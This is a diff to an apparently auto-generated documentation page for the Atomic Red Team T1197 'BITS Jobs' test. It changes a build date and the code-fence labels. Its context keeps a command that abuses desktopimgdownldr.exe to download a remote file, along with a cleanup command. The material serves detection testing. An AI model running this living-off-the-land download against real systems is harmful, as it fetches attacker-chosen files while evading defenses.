@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1197"
 attack_technique_name: "BITS Jobs"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "afb5e09e-e385-4dee-9a94-6ee60979d114"
@@ -71,13 +71,13 @@ and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windo
 
 ### Command
 
-```commandprompt
+```cmd
 set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{cleanup_path}\#{cleanup_file} >nul 2>&1
 ```
 
